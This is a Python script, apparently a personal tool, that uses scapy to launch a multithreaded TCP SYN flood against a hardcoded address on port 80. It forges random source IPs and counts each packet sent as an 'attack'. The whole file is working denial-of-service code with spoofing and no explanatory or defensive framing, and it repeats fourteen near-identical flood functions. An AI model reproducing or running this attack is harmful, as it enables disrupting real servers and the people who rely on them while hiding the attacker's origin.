import _thread as thread
from scapy.all import *
import random
import time

global number

def ip_list():
    for i in range(1,100):
        one = random.randint(1,255)
        two = random.randint(1,255)
        three = random.randint(1, 255)
        four = random.randint(1, 255)
        ip = str(one) + '.' + str(two) + '.' + str(three) + '.' + str(four)
        # print(ip)
        forge_ip_list.append(ip)


def SYNflood1(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程1：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood2(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程2：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood3(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程3：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood4(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程4：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood5(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程5：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood6(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood7(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood8(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood9(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood10(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood11(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood12(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood13(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break
def SYNflood14(target,dport):
    ip_list()
    global number
    for sport in range(1024,65535):
        index = random.randrange(99)
        ipLayer = IP(src=forge_ip_list[index],dst=target)
        tcpLayer = TCP(sport=sport,dport=dport,flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        number += 1
        print('线程6：第{}次攻击'.format(number))
        # if int(time.time()) == t:
        #     print(number)
        #     break

def threads(target,port):
    t1 = threading.Thread(target=SYNflood1, args=(target,port,))
    t2 = threading.Thread(target=SYNflood2, args=(target,port,))
    t3 = threading.Thread(target=SYNflood3, args=(target,port,))
    t4 = threading.Thread(target=SYNflood4, args=(target,port,))
    t5 = threading.Thread(target=SYNflood5, args=(target,port,))
    t6 = threading.Thread(target=SYNflood6, args=(target,port,))
    t7 = threading.Thread(target=SYNflood1, args=(target,port,))
    t8 = threading.Thread(target=SYNflood2, args=(target,port,))
    t9 = threading.Thread(target=SYNflood3, args=(target,port,))
    t10 = threading.Thread(target=SYNflood4, args=(target,port,))
    t11 = threading.Thread(target=SYNflood5, args=(target,port,))
    t12 = threading.Thread(target=SYNflood6, args=(target,port,))
    t13 = threading.Thread(target=SYNflood5, args=(target,port,))
    t14 = threading.Thread(target=SYNflood6, args=(target,port,))
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    t11.start()
    t12.start()
    t13.start()
    t14.start()




if __name__ == '__main__':
    global number
    number = 0
    target = '192.168.43.174'
    port = 80
    forge_ip_list = []
    t = int(time.time()) + 2

    threads(target,port)

